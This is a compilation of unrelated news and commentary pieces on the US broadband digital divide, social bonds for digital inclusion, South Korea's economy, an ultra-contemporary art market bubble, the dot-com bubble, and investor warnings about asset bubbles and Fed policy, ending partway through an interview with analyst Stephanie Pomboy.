Levin notes that although the affordability gap gets the lion’s share of attention in Washington policy debates, the affordability gap actually affects three times as many Americans. A report released in February from BroadbandNow Research, a firm which provides independent data and research on broadband access and policy, found the FCC’s estimate that 21 million Americans lack access to broadband actually undercounts the figure by 20 million.

Tyler Cooper, the editor in chief at BroadbandNow, notes that “the access component is pretty key, but then even in the areas where you do have broadband service, kind of turning back toward urban areas specifically, you can have a pretty large adoption divide as well.”

The final gap, in Levin’s view, is a business opportunity gap, which is a measure of how many people are unable to fully participate in an economy that’s more inclusive and equitable via broadband and information services.

How Does the Digital Divide Impact Education Within States?

The digital divide has been profoundly felt over the past year in households across the country with students in grades K–12, as students and their families adapted to the necessities of remote learning.

An October 2020 report from the National Education Association estimates that a quarter of all school-aged children — about 13.5 million in the U.S. — live in households without broadband access or a computer or tablet.

Researchers from Public Policy Associates reviewed data from the U.S. Census Bureau’s American Community Survey to explore the digital divide for students.

According to the NEA report, “inequality systematically tracks across historic divisions of race, socioeconomic status and geography.”

The report found the following, according to an NEA statement:

School-aged children in households that are below the federal poverty threshold (53 percent) are much less likely than those above the poverty line (79 percent) to have access to both broadband and a computer.

White school-aged children (80 percent) have better access than African American/Black (64 percent) or Hispanic/Latinx (66 percent) children. Just 50 percent of American Indian and Alaskan Native children have full access.

Families who have a parent at home during times of remote instruction are more likely to have full access than those who do not (77 percent vs. 71 percent).

“The fact that it has been highlighted so dramatically at a time when there is remote learning and families that don’t have internet access are at a severe disadvantage in terms of having their children be educated at all, is one way to underscore the broader problem,” Boucher says.

Cooper notes that stories abounded this past year of students driving for miles to find a Wi-Fi hotspot to do homework in their cars, or students camping out in school parking lots to get access to hotspots that were established on an emergency basis. The digital divide affects students in rural, urban and suburban areas, he notes.

What Are States Doing to Bridge the Digital Divide?

State governments, in addition to governments at the local level, have taken concrete steps to close the digital divide over the past year, though experts argue those efforts were largely patchwork or emergency efforts and must be sustained in the years ahead.

According to the nonprofit National Digital Inclusion Alliance, states took actions primarily in four areas: expanding internet access, expanding device access, increased tech support and digital literacy efforts, and planning and coordination of digital equity efforts.

For example, Alabama Gov. Kay Ivey committed $100 million in Coronavirus Aid, Relief and Economic Security (CARES) Act funding to purchase internet service for low-income households with eligible K–12 students.

Connecticut Gov. Ned Lamont launched a $43.5 million investment in remote learning solutions to close the digital divide in the state.

In Kansas, the Kansas State Finance Council approved $60 million in grants to improve state broadband infrastructure.

Missouri Gov. Mike Parson set aside $50 million in CARES Act funding to help schools offer online learning and allow for greater use of telework and telemedicine strategies.

“I think the governors really stepped up and did a great job,” Levin says. However, he notes, the pandemic “accentuated an existing problem.”

Cooper notes that both the federal and state and local governments are “aligned with the same overarching goal, which is to bring every American online, and that feels more true now than ever.”

However, he notes, the federal government is positioning itself as a market correction tool, especially to accelerate the deployment of broadband in rural America. That will occur by creating incentives for private companies to deploy broadband at scale in rural parts of the country. That may include changing the definition of broadband to something approaching 100 megabits per second for uplink and downlink, which would help accelerate the move away from legacy technologies such as DSL that do not provide symmetrical broadband access.

At the state level, Cooper says, a lot of action will center on whether state regulations change to enable municipalities to create their own broadband networks.

“Everywhere we’ve seen municipal broadband networks put in place, we’ve seen that prices are lower on average and speeds are higher on average. Having that public option is a pretty crucial element, especially for areas that simply don’t have private competition.”",Digital Inequality,2021-04-21 07:00:00

In its most basic sense, digital inequality has two main components:

1. Access to the digital economy for which you need connectivity,

2. Having the necessary skills to benefit from this access.

This divide between the ‘haves’ and ‘have nots’ is based on layers of socio-economic, gender, regional and racial inequalities, and is now a critical global issue. Indeed, the United Nations has designated access to the Internet along with information and communications technology (ICT) as one of the targets for Sustainable Development Goal (SDG) 9.

What impact did the pandemic have on the divide?

In our view, the pandemic has highlighted – and in some cases accentuated – the digital divide that exists between different families and communities and the corresponding inequalities that come into play. It has helped move the issues of digital access and skills centre stage.

For example, in the United States, according to the Federal Communications Commission, more than 21 million Americans have no access to a broadband connection with acceptable download speeds of 25 megabits per second. Other estimates suggest this number is as high as 42 million. If we add to this the lack of access due to affordability, the number goes up further.

We can easily see why this would be an issue when looking at the Pew Research Center data which shows that 15% of households with school-age children don’t have a high-speed internet connection at home. When basic services like education move online overnight, those most impacted are often low-income students and students of colour.

The issue with the digital divide or gap is that the impact will be over the medium to long term. It will tend to take a backseat to ‘here-and-now’ type issues like food insecurity and unemployment. However, when it starts to impact access to basic services such as education and subsequently employment, it becomes more structural in nature. Closing this gap will be hard unless we act now. Without access, whole sections of society will be marginalised even further.

Turning to the second component of the digital divide, the skills gap. That is, a lack of skills in the existing workforce or not having workers trained for the skills needed in the future.

Today, more than 80% of current middle-skill jobs in the US, which are jobs that require less than a bachelors degree, need digital skills. We have seen companies taking an active role in programmes to close the skills gap. A good example is the certification programmes provided by some of the large digital platforms on data analytics, project management and so on. These certifications can be used in place of a 4-year college degree when applying for jobs at the company in question.

The bottom line is that over the medium to long term, we expect the penetration of digital methodologies to increase significantly in key areas like education and healthcare. As we build a post-pandemic world, we need to ensure that we build a more resilient one too. Closing the digital gap from an access and skills perspective will lead to healthier communities in the long run.

What role can the public and private sector play in reducing digital inequality?

There is great divergence across countries when it comes to broadband access and closing this gap is a priority in several countries. Having a cohesive framework is important to ensure that the digital economy benefits all sections of society. The UN recently released a report called “the age of digital interdependence” which laid out recommendations for global collaboration to ensure an inclusive global digital economy and society aligned with the SDG goals of 2030.

With regard to government and public funding, if we focus on the here and now, when the pandemic started in the US, the Federal Communications Commission (FCC) called on broadband service providers to take a pledge to “ensure that those impacted by the pandemic don’t lose their broadband or telephone access.” Almost 200 companies agreed not to cut off service for non-payment. On the funding side, the Coronavirus Aid, Relief, and Economic Security (CARES) act allocated a few hundred million US dollars as loans and grants to expand broadband for essential services. Separately, many states and municipalities have targeted local plans as well.

In the private sector, there are investment options across all asset classes when it comes to digital infrastructure. There is a wide array of opportunities from mature models like data centres and telecom towers where the economics are well established, to more complex projects involving broadband buildout and financing the last mile. Depending on the risk/reward requirements of the investor, opportunities range from public equities to private debt.

Can social bonds be part of the solution?

Absolutely. By now, most people are aware of green bonds, which are used to finance eligible environmental projects. In the case of social bonds, the proceeds are earmarked for projects or assets that target a positive social outcome. This debt obligation is backed by the entire balance sheet of the issuer – so this is credit equivalent to a normal bond.

To give an example, in 2019 a communication service provider with a large emerging market footprint issued a social bond. The proceeds could be used for capital expenditure needs such as network rollout and spectrum acquisition. The logic being that expansion of the network infrastructure, especially in underserved communities, would improve digital access. The proceeds could also be used to finance projects such as training women and children in digital technologies.

When the company issued the bond, there was also guidance on impact metrics that the firm would report, such as number of homes passed, homes connected, number of women trained on online skills and so forth. Reporting on such metrics is key to ensuring that positive social outcomes are achieved.

What are the prospects for the social bond market?

The market is still in its infancy but growing very strongly. Recently, one of the largest internet companies issued a sustainability bond of US Dollar 5.75 billion, which is by far the largest issuance of its kind. The bond was oversubscribed suggesting strong demand among investors. So the market is definitely growing and raising interest.

In addition, the COVID-19 crisis has highlighted a greater awareness of social considerations in investment decision-making. BNP Paribas Asset Management sponsored a study by Greenwich Associates which showed that social factors have become more of a focus for almost a quarter of surveyed investors as a result of the pandemic and 70% also said social considerations – the ‘S’ of ‘ESG’ – will become extremely or very important as we move forward.

The COVID-19 pandemic has caused a global socioeconomic crisis. If we are to come out of this as a more resilient society, we must address key issues like reducing the digital divide, and there's a role for social bonds and investors more broadly in working towards this goal.

HONG KONG, June 13 (Reuters Breakingviews) - South Korea is having a moment. As governments around the world fret about surging commodity prices, fragile economic growth and volatile markets, newly elected President Yoon Suk-yeol is kicking things off on a surprisingly upbeat note. Local companies are bouncing back, with many of them venturing abroad. The confidence should pay off.

The headline figures paint a less pretty picture. After expanding by 4.1% in 2021 – an 11-year high – the $1.6 trillion export-dependent economy is forecast to grow just 2.7% this year as demand from China, its top trading partner, cools. read more The central bank's new governor in April issued a dire warning that war in Ukraine, a China slowdown, higher U.S. interest rates combined with the country's aging population and decreased productivity might tip the economy into an era of low growth and high inflation known as stagflation. Rising inequality and high household debt are also concerns.

The mood in Seoul, however, is notably upbeat. The sprawling metropolis of nearly 10 million people recently scrapped pandemic restrictions such as business curfews and mandatory vaccine passes. Restaurants, bars and coffee shops are packed; last week's friendly soccer match between South Korea and Brazil attracted 64,000 fans to sell out Seoul World Cup Stadium.

Compared to pre-pandemic times, the capital city feels richer and more vibrant. A recent boom in local stocks, cryptocurrencies and real estate have spurred the city's elite, unable to travel, to flex their wealth at home. Demand for art, imported wine, high-end fashion, cars, and even perfume, is taking off. Luxury sales topped $14 billion in 2021, making South Korea one of the few markets worldwide to surpass 2019 levels, according to Euromonitor.

Optimism is evident across Korea Inc too. Covid-19 has been a boon to domestic companies like e-commerce group Coupang and major exporters, including the $350 billion memory-chip maker Samsung Electronics (005930.KS). But during the previous liberal government under Moon Jae-in, firms faced higher corporate taxes, minimum wage increases, cuts to working hours and tougher competition laws. Yoon's pro-business agenda, by contrast, promises deregulation and tax cuts.

WESTWARD EXPANSION

The shift has emboldened the country's powerful family-run conglomerates, or chaebol. Less than a month after Yoon took office, the Samsung group unveiled a bold $356 billion investment plan though 2026, 30% more than in the previous five-year period. read more It says it will target semiconductors and biopharmaceuticals, creating over 1 million local jobs in the process.

At the same time, U.S.-China tensions have elevated South Korean technology and components in Western supply chains. U.S. President Joe Biden courted chaebol leaders like Samsung's Jay Y. Lee and Euisun Chung of Hyundai Motor Group during his visit last month. The two scions have committed billions of dollars to new semiconductor and electric vehicle factories in the United States. Compatriots like LG Energy Solution (373220.KS), SK On and Posco Chemical (003670.KS) also have struck deals with U.S automakers in electric-vehicle batteries and materials.

Beyond manufacturing, once-insular industries are gaining global traction too. K-pop boy band BTS was the world's best-selling act in 2021; drama series ""Squid Game"" smashed viewing records to become Netflix's (NFLX.O) most watched show; Krafton's (259960.KS) ""PUBG Mobile"" retained its spot as one of the world's top grossing games. The international successes have infused companies with confidence to venture out: internet outfits Kakao (035720.KS) and Naver (035420.KS) struck read more digital content deals in North America worth a combined $1.6 billion, while CJ ENM (035760.KQ), the company behind Oscar-winner ""Parasite"", recently snapped up an 80% stake in a U.S. studio.

In total, outward foreign direct investment in 2021 hit a record high of $76 billion, according to official figures, up by more than a fifth from pre-pandemic levels. More cross-border deals will come. Telecoms-to-energy chaebol SK Group, for example, appointed its first head of U.S. corporate and government affairs as the conglomerate readies a strategic pivot stateside.

Such moves should help reduce the country's trade dependence on China. Of course, a more globally integrated and diversified economy also invites fresh risks.

Manufacturers like Samsung have long walked a geopolitical tightrope between Beijing and Washington. Yoon's tilt towards America will make it harder to do so. Moreover, given South Korea's rising clout in electric vehicles and semiconductors, tensions with North Korea present supply chain risks. Both sides fired missiles earlier this month amid worries that Pyongyang is readying a nuclear test. There are plenty of reasons these days for governments and investors to be fearful, but that also makes it a good time for an emboldened South Korea and its companies to step up.

This week, wondering when a buoyant market will start leaking hot air…

THE TROUBLE WITH BUBBLES

With nearly half the art market’s major 2022 events now behind us, works by young artists are still sucking up most of the excitement and a healthy chunk of the sales revenue in our surprisingly resilient space. So it’s no surprise that several market observers and participants have asked me some version of the same question in the past few weeks: How much longer before the bubble for ultra-contemporary artists pops?

Real talk: if I had a good calendar-based answer to that question, I’d be safeguarding it for my own financial benefit. (What can I say? The 21st-century media economy isn’t exactly building generational wealth for online trade journalists.) Instead, the reason I’m uncomfortable about charting a timeline for the decline of the still-fevered demand for works by young artists is because our understanding of asset bubbles is much hazier than most people invoking the term care to admit. In fact, award-winning economists and financial analysts largely agree that, in any market, your only hope of stamping an accurate expiration date on a bubble is by waiting until it’s already deflated.

Before I barrel into the big ideas, it’s worth summarizing the state of play in the market for the art world’s blazing-bright stars. While this sector has been going bonkers for at least 18 months, the activity has only accelerated this year.

At the 20th- and 21st-century art sales at Christie’s Hong Kong last week, more than one-third of the 35 auction records set belonged to millennial artists, according to a house statement. The evening sale’s fireworks featured results above $1 million for seven ultra-contemporary artists (which we at Artnet define as artists born after 1974), including Hernan Bas, Loie Hollowell, and Hilary Pecis.

A similar story unfolded during May’s auction extravaganza in New York. By my count, works by eight artists aged 40 or younger crossed the million-dollar milestone there, with Maria Berríos, Shara Hughes, Anna Weyant, and the late Matthew Wong doing so multiple times. Several more artists in the ultra-contemporary bracket flirted with or established new bests under the gavel in the mid-to-high six figures.

Outside the auction sector, more and more galleries with searing-hot artists are using rampant demand to strong arm collectors into accepting “buy one, give one” (or BOGO) deals, whereby collectors can acquire paintings for their personal collections only if they also buy another work by the same artist to donate to an institution. Mega-dealers now regularly sign talents who would likely still be years away from reaching such rare air in an earlier generation.

Sustained success has been pushing scores of galleries at all levels of the commercial ladder to add more permanent space for exhibitions and sales. Some secondary-market specialists (like Christophe van de Weghe) have even decided to move into the primary market because that’s where much of the energy and money is—a perfect 180 from where we were in the aftermath of the Great Recession, when a growing number of primary dealers were expanding into the secondary market for survival and clout.

Is this sector of the art economy in a bubble, though? Answering that question turns out to be even harder to judge for paintings and sculptures than for traditional investable assets.

BUBBLE BOBBLE

Given how often the subject of bubbles drives everyday economic discourse, you would think researchers, analysts, and policy makers had reached at least some loose consensus about how to define the term. But they haven’t.

This fact makes some sense of the punditry landscape: If we had clear criteria for what makes a bubble, people probably wouldn’t be almost constantly scrapping over whether or not we’re in the midst of one. Jerusalem Demsas, a policy reporter with a special focus on U.S. housing (a market that’s no stranger to bubble talk), wrote last year that there is “no agreed-upon economic definition for an asset bubble” even among the discipline’s apex tier of thinkers:

Ask two Nobel Prize-winning economists, and the answer is blunt: ‘It’s impossible to know for sure whether something’s a bubble,’ said Richard Thaler in a conversation with his colleague Eugene Fama. “What’s the bubble?” Fama added. “The up? The down? The subsequent up?”

The key problem is timing. Even when you can find relatively broad agreement about a given asset-class bubble, solidarity arrives too late. Here’s Fama drawing out the idea a bit more in a 2010 interview:

I think most bubbles are twenty-twenty hindsight. Now after the fact you always find people who said before the fact that prices are too high. People are always saying that prices are too high. When they turn out to be right, we anoint them. When they turn out to be wrong, we ignore them. They are typically right and wrong about half the time.

What makes the task so difficult is that supply and demand are not the alpha and omega of identifying bubbles. For example, Demsas brings up a 2019 study of 40 periods in the U.S. and international stock markets since 1926 where share prices rose by more than 100 percent; the researchers found no evidence on average that these price spikes were followed by “unusually low returns going forward.” In other words, even when demand for stocks suddenly rocketed up to the penthouse level, it didn’t necessarily mean the elevator cable snapped soon after.

I touched on more anecdotal evidence of this phenomenon a few columns ago. Every classical metric agreed that Clinton-era tech stocks were trading for unsustainable prices by 1996, but the dotcom bubble didn’t pop until 2000. Wall Street skeptics started waving price data around to declare that the contemporary stock market had peaked as far back as 2011; even after months of carnage in the financial markets this year, we still have not entered a bear market 11 years later (though this could finally change depending on what happens in the coming weeks).

So, correctly calling an imminent crash demands pinpointing something more than data on economic fundamentals can tell us, even in the most information-rich sectors of the financial markets. No surprise, then, matters only get murkier if you try to do the same in the art market.

PSYCHODRAMA

While fast and furious price rises are a key component in inflating asset bubbles, many, if not most, serious economic thinkers also agree that the other necessary ingredient is unbridled sentiment—basically, a shared compulsion among buyers that a particular asset or subset of assets is so desirable that they will go to borderline-manic lengths to try to acquire it. Nobel Prize-winning Yale economist Robert Shiller has even likened the average bubble to an epidemiological phenomenon, “a sort of epidemic of an idea” that everyone should be spending their time, money, or both in the same place.

Unlike epidemics of disease, however, epidemics of ideas are nearly impossible to measure in a rigorous way. Prices send a signal, but we’re still left to make inferences from intuition and anecdotes; the wilder the anecdotes, the more likely it seems to be that a bubble is about to burst. To cite two indelible examples, Demsas recently reported that the U.S. housing market has careened so far off the rails that prospective home buyers are “offering to name their firstborn child after the sellers if their bid is picked,” while 63 percent of home buyers in 2020 put in at least one offer on a house without ever stepping foot inside. That, as my dad would say, is a yikes.

I’m sure several readers have heard gossip about collectors going to extreme lengths of their own to try to jump the wait list for artworks by the current cluster of ultra-contemporary supernovas. There’s a reasonable argument that the pure existence of BOGO deals is proof that a thought epidemic has turned this sector of the market into an unjustified melee between buyers. Still, even if this is true, it tells us nothing about how close the speculative fever might be to breaking.

Artwork’s lack of economic fundamentals makes it even harder to accurately call the top in our niche market. Although Thaler thinks bubbles are nearly impossible to predict in a precise way, he did argue in a 2010 interview that it’s within economists’ capabilities to build a “bubble warning system” for financial markets using objective metrics like price-to-earnings ratios among publicly traded companies. (This kind of system would not be able to time a crash, he said, but it could at least alert the market when the probability of a crash had surpassed certain thresholds.) Yet the only data we could channel into a bubble warning system in the art market would be resale prices. Those are cruder measures than P/E ratios—and scarcer ones, too, since the private art market (both the primary and secondary one) overwhelmingly remains a mass of dark matter to the public.

Do dozens and dozens of runaway auction results for ultra-contemporary artists hint that we’re hurtling toward a market correction? Yes, but that’s a fairly worthless statement unless I can also tell you roughly when the correction will come. I can’t do that. In fact, I’m even more sure that I can’t do it now than I was before I started writing this column.

What I can say is that all markets move in cycles, and the lifespan of each new phase depends at least as much on shared beliefs as on economic fundamentals. If this makes timing the financial markets unpredictable, it makes timing the art market (or even one branch of it) all but impossible. Succeeding would demand synthesizing vivid anecdotes that only a small population of people will ever hear, broader market sentiment grounded in personal intuition, and a small collection of verifiable sales results for items whose values are always and forever subjective.

That’s either a fool’s errand or the greatest trick the devil ever pulled. The rest of us will just have to wait and see how much further deep-pocketed buyers are willing to bloat the prices for top ultra-contemporary art, because nothing is really a bubble until after it bursts.

What Was the Dot-Com Bubble?

The notorious “dot-com” bubble—also known as the tech boom or internet bubble—was a period from about 1995 to about 2001 during which internet-related tech companies attracted a massive amount of attention from venture capitalists and traditional investors.

This influx of money combined with the exploding popularity of the internet in general caused the web sector to expand rapidly in terms of valuation over the course of a few years despite many companies lacking concrete paths to profitability. Low interest rates in the late 1990s made debt financing easier to acquire, further fueling the internet industry’s unchecked growth.

Eventually, around late 2000, these streams of easy money dried up, and the industry imploded, causing many tech companies to go under and ushering in a new bear market that would last for around two years and affect the entire stock market—not just the technology sector.

How Did the Dot-Com Bubble Form?

In the early 90s, the advent of web browsers made the internet much more accessible for the average consumer. Once rare, computers began to appear in more and more households in the U.S., eventually becoming somewhat of a necessity. As the popularity of computers and the internet grew, many new web companies emerged to carve out their slice of the rapidly expanding information technology and online commerce industries.

In the late 90s, low interest rates made speculative equity investments more attractive than bonds, and at the same time, innovative internet companies grew in popularity among retail investors, professional traders, venture capitalists, and institutional investors alike. When the Taxpayer Relief Act of 1997 passed, the top capital gains tax rate was lowered, providing yet another incentive for equity speculators to pour money into the fledgling internet industry.

Investment banks earned massively by facilitating IPOs for one tech company after another, and starry-eyed investors threw fundamentals like P/E ratios out the window and pumped money into young dot-com companies (most of which had yet to turn a profit) for fear of missing out on the digital gold rush that was sweeping Wall Street.

This influx of money acted like a bellows, inflating the untested internet technology industry into an overvalued bubble ripe with surface tension and ready to burst.

This graph of the value of the tech-heavy Nasdaq Composite index shows the dot-com bubble forming around 1995 and gathering value until early 2000 when it began to burst, portending a two-year bear market and mild recession.

When and Why Did the Dot-Com Bubble Burst?

It’s always difficult to identify a single catalyst that causes the bursting of an asset bubble, but in the case of the internet bubble, two factors seem to have played at least some part in the industry’s rapid decline, which began after the tech-heavy Nasdaq composite peaked on March 10th, 2000.

The first factor was rising interest rates. The Federal Reserve raised the fed funds rate (which informs most other interest rates) several times over the course of the years 1999 and 2000. Higher interest rates tend to motivate investors to move money out of more speculative assets (like internet company stocks) and into interest-paying assets like bonds.

The second factor was the onset of a recession in Japan in March of 2000. News of this recession spread fast and led to a wave of fear that triggered a worldwide selloff, moving even more money out of speculative equities and into safer, fixed-income instruments like bonds.

These two factors, among others, helped catalyze the bursting of the overinflated internet bubble. Internet stocks began to lose value, which spread fear among investors, in turn causing additional selling—this self-reinforcing process is known as capitulation, and the selloff continued until the Nasdaq hit its bottom around October of 2002.

How Long Did the Bubble Last? How Long Was the Bear Market That Followed?

Bubbles—including the dot-com bubble of the late 1990s—don’t really have definite start dates, but assuming the bubble “started” sometime around 1995 and ended when the Nasdaq composite peaked in March of 2,000, you could say the dot-com bubble grew for about five or six years before bursting. The bear market that followed lasted about two years.

Which Companies Survived the Dot-Com Collapse?

While many tech companies bit the dust during the bubble’s collapse, some persevered through the turbulence and bounced back in the years that followed. According to the New York Times, something like 48% of the companies involved in the asset bubble survived the crash, but most still temporarily lost the lion’s share of their value. The following are a few examples of now-successful companies that survived the ill-fated tech boom.

How Did the Dot-Com Crash Affect the Economy? Did It Cause a Recession?

What defines a recession varies depending on who you ask, but it would certainly be safe to say that the bursting of the internet bubble led to a pretty severe bear market. According to most analysts, the dot-com crash did cause a mild recession, but its effects were not nearly as disastrous as those of the subsequent 2008 recession caused by the implosion of the mortgage-backed securities market and the housing bubble.

Of course, many who worked in the tech sector became unemployed as the businesses they worked for saw their financing dry up. Adjacent industries, like advertising, were also affected as failing tech companies stopped pumping money into elaborate marketing efforts. Overall, it took the market about two years to get back into bull territory after the two-year dot-com recession (or bear market—whichever you prefer).",Asset Bubble Burst,2022-05-31 07:00:00

It’s one of the most pertinent investor notes from a Fund Manager that the Asia Markets team has come across in recent times – “When the everything bubble burst”.

Penned by Tim Price, a down-to-earth money manager who’s watched in bemusement as multiple dispersion in U.S. stock markets reached dot com bubble levels in recent years.

Tim is also the author of a great read, titled, “Investing through the Looking Glass: a rational guide to irrational financial markets”.

In the new note, Price provides a response to the biggest question on the minds of investors the world over right now – what the hell should I invest in?

With inflation soaring, interest rates rising, and geopolitical uncertainty griping the world, you can understand why investors are perplexed. In the risk-off environment the NASDAQ is down around 30% year-to-date, the S&P 500 down 18% and the Dow off 15%.

Still, relative to history headline stock market valuations remain high, following a multi-decade QE-fuelled bull market.

So, what happens if the unravelling continues and the stock market crash intensifies?

Why this stock market crash is different

Despite many drawing parallels between the current market and the dot com bubble, Price is unequivocal in his view that the current market (Bubble 2.0), is different.

In fact, he believes it’s worse.

“The reason why the market environment is now so much scarier than early 2000 from the vantage point of June 2022 is simple. Whereas the millennial bubble was in dotcom stocks and almost nothing else, Bubble 2.0 is in just about everything,” he says.

“It is universal. It goes beyond a segment of the stock market (technology) to take in virtually all of the US stock market, and those of most other developed economies, too. Worse still, it transcends the asset class of listed equities and has managed to infect global debt markets, and many property markets, as well.”

So, how do investors survive the prospect of the collapse of the everything bubble? Price makes 4 key suggestions:

There is no single magic bullet to surviving the crash of the everything bubble Diversify as far and wide as possible The starting valuation of any investment should be of paramount importance Value investing, trend-following, and gold may be viable solutions

A time for value investors to shine

Above all, Price suggests value investing could be the best way to navigate the bursting of the everything bubble – and generate alpha along the way.

This, of course, is no surprise – he runs a value-focussed asset management firm. However, he’s not holding back on his current conviction.

“We humbly submit this may soon be one of the best times in history to be a value investor – whether in relative, or absolute terms,” says Price.

“We may be wrong – QE and ZIRP have been with us for over 10 whole years now – but we sense a disturbance in the force, as the Fed continues to hike, and bond yields and stocks creak and fragment under the accumulated pressure of an at least decade-long foray into absurdity.“

Michael Burry hinted that sliding stocks and falling home sales remind him of the 2008 housing bust.

Observing the current market is like watching a plane crash, the ""Big Short"" investor said.

Burry, who warned asset prices would crumble, said he doesn't take pleasure in being right.

Tumbling stocks and slowing home sales remind Michael Burry of the collapse of the mid-2000s housing bubble, the investor of ""The Big Short"" fame hinted in a now-deleted tweet on Tuesday.

""As I said about 2008, it is like watching a plane crash,"" he said. ""It hurts, it is not fun, and I'm not smiling.""

Burry told New York magazine in December 2015 that as the housing market crumbled in late 2007, he had a recurring nightmare about the disaster, in the form of an airplane crashing.

""I knew what was happening, but there was nothing I, or anyone else, could do to stop it,"" he told the publication. Burry added that on the last day of 2007, he was too upset by the catastrophe to leave his office and go home to see his family.

The Scion Asset Management boss posted his latest tweet shortly after the US government released data showing sales of new, single-family homes fell by nearly 17% month-on-month to 591,000 units in April — well below the consensus forecast of 750,000 units.

Moreover, the benchmark S&P 500 index slid as much as 2.5% on Tuesday, and closed 18% lower for the year. The tech-heavy Nasdaq fell as much as 3.8%, and has now slumped 29% this year.

Burry shot to fame after he predicted, and made a fortune betting on, the housing-market crash in 2007 and 2008. He has repeatedly drawn parallels between the run-up in asset prices during the COVID-19 pandemic and the bubble that made him famous.

""Fads today (#BTC, #EV, SAAS #memestocks) are like housing in 2007,"" he tweeted in March 2021.

""On the whole, not wrong, just driven by speculative fervor to insane heights from which the fall will be dramatic and painful,"" he added.

Burry, who bet against Tesla stock last year, has also compared the hype around Elon Musk's electric-vehicle company to the housing boom.

Story continues

""Well, my last Big Short got bigger and bigger and BIGGER too,"" he tweeted in response to Tesla's stock price soaring. ""Enjoy it while it lasts.""

Tesla stock has plunged 48% this year, wiping close to $600 billion from its market capitalization.

More broadly, Burry has predicted the next market crash will dwarf the 2008 bust, which sparked a global financial crisis.

He sounded the alarm on the ""greatest speculative bubble of all time in all things"" last summer, and warned retail investors pouring their money into meme stocks and cryptocurrencies that they were barreling towards the ""mother of all crashes.""

Bashing the Federal Reserve for uncorking inflation has become a parlor game — never mind that the Fed also saved the nation from a pandemic depression and that inflation is set to fall sharply. But another line of criticism is scarcely mentioned. For the third time this century, the Federal Reserve has responded belatedly to signs of a bubble. As a result, tech stocks, cryptocurrencies and even a few analog assets are crashing hard. The fallout could be nasty.

The Fed’s bubble tolerance escapes remark because of a dubious argument. By and large, Fed watchers accept that irrational exuberance is not the Fed’s problem. According to this line of thought, the central bank’s job is to control inflation in the real economy: It should focus on the price of eggs, not nest eggs. The Fed should not be held responsible for causing bubbles. Nor should it be expected to deflate them.

People who work in finance tend to regard these assertions as wacky. If central bankers cut interest rates, people will borrow cheaply to speculate on stocks or real estate or cryptocurrencies: Of course the Fed can cause bubbles. But the central bank and its allies have deflected this logic with three claims. That Fed policy affects asset prices only weakly; that the Fed’s core inflation-fighting mission is so important that distractions must not be allowed; and that it’s easier to clean up bubbles after they burst than to worry about them prospectively.

These arguments, which date to the 1990s, were always overstated. But given the experience of the past quarter-century, not to mention the past couple of weeks, it is time to abandon them.

The idea that monetary policy only weakly affects asset prices originates in the bubbly dot-com era. Pajama-clad day-traders and boosterish financial media were said to explain the mania; interest rates were a sideshow. In fact, the bubble turned wild after a series of panicky interest-rate cuts followed the implosion of a major hedge fund in 1998; it burst in 2000 after the Fed began to tighten. But the Fed got away with the narrative that the bubble had been a cultural phenomenon, not a monetary one.

Whatever the arguments of that period, the claim of monetary irrelevance ought to have died with the Fed’s policy of quantitative easing after the 2008 crash. The whole idea behind such easing is that Fed policy does affect markets: As the Fed’s then-Chair Ben Bernanke explained, easing suppresses the interest rate on bonds, thereby driving investors to seek returns from stocks and other assets. So much for the pretense that Fed policies are incidental to animal spirits.

Next, consider the notion that the Fed must not be distracted from its core inflation-fighting mission. Nobody doubts that inflation is indeed core. But after 2008 the Fed began to focus on employment as a secondary goal; and in 2020 it replaced its clear inflation target of 2 percent with a vague 2 percent average. With these modifications, the Fed was saying that simple inflation targeting was not enough to secure its larger objective of stabilizing economic growth. Well, if that’s the case, why not add bubble avoidance to the framework?

Finally, there’s the idea that it’s better to clean up after bubbles than avert them. Again, this was never persuasive. The mortgage bubble of 2008 was extremely costly to clear up; and the dot-com bubble, milder because it involved less financial engineering and debt, was nonetheless more toxic than is usually acknowledged. The dot-com implosion caused a collapse in capital spending, driving the Fed to respond with dramatic cuts in interest rates, which in turn set off the frenzy of borrowing that culminated in the subprime mania.

Will this time be different? It’s too early to be certain. Housing-market forecasters still sound remarkably cheery; but with mortgage interest rates rising, check back in a month or two. The tech-heavy Nasdaq index is down by a quarter since the start of this year, incinerating almost $5 trillion, and tech companies are announcing hiring freezes. More bad news will probably follow. Crypto trading may be too small to affect the economy writ large. But it’s not great for the psychology of alienated netizens when an Icarus token like Luna incinerates $28 billion in imagined wealth in just a week; or when Bitcoin’s more than 50 percent drop since November wipes out $700 billion.

None of this is to say that the Fed is wrong to tighten. To the contrary, once a bubble exists, it is best to pop it expeditiously. But would it have been better to soften the disruption by acting before the bubble grew so large? If the Fed’s mandate is to smooth the path of the economy and avoid the pain of disruptions, of course it would.

Right now, the founder and president of the economic research firm MacroMavens is forecasting a profits recession, marked by a “huge margin squeeze for the average corporation.”

It will be a significant price squeeze not experienced since the 1970s, as she tells ThinkAdvisor in an interview.

Gutsy and prescient, in 2002 the economic analyst predicted the housing bubble’s imminent inflation long before others saw it. In 2007, she foresaw the worst financial crisis since the Great Depression.

Last year, Pomboy warned of a stock market crash.

Her profits recession forecast is based on fact: Input costs have been “outpacing the ability [of corporations] to pass them on,” she argues.

Indeed, “the relationship between input costs and consumer prices is so integral to the outlook for the stock market,” she says.

Pomboy contends that the Federal Reserve’s monetary and fiscal stimulus during the worst of the coronavirus pandemic did little to increase economic activity but instead, did much to create “a massive bubble in financial assets,” which now, as a result of the stimulus withdrawal, is starting to deflate, she says.

In the interview, Pomboy, whose clients include investment firms, mutual funds and hedge funds, among others in and out of financial services, maintains that today’s primary risk is that the Federal Reserve will “belatedly ransack inflation.”

Diving beneath the surface of existing trends, she analyzes economic and financial market data to find and interpret subtle signals for shifts.

That is, she seeks what’s not priced into the market, then forecasts the implications.

Pomboy launched MacroMavens 20 years ago after a decade working with Ed Hyman at C.J. Lawrence and ISI Group. She picked up an economics degree from Dartmouth College in 1990.

She produces two weekly reports covering risks and opportunities, one for institutional investors, the other for retail investors.

Her podcast is “The Super Terrific Happy Hour” (“business, finance and economics, with a side-order of skepticism”), which she cohosts with Grant Williams.

ThinkAdvisor interviewed Pomboy on May 17. She was speaking by phone from her base in West Palm Beach, Florida.

She noted that no one else seems to be forecasting a profits recession because Wall Street “take[s] whatever the companies say as gospel until they say otherwise. No one is looking ahead.”

Here are highlights of our interview:

THINKADVISOR: What are you discerning from your analysis of the economy and financial markets?

STEPHANIE POMBOY: There’s the very real prospect of a profits recession. Yet nowhere on Wall Street is anyone forecasting this. It seems to be it’s a no-brainer.

The relationship between [corporate] input costs and consumer prices is so integral to the outlook for the stock market.

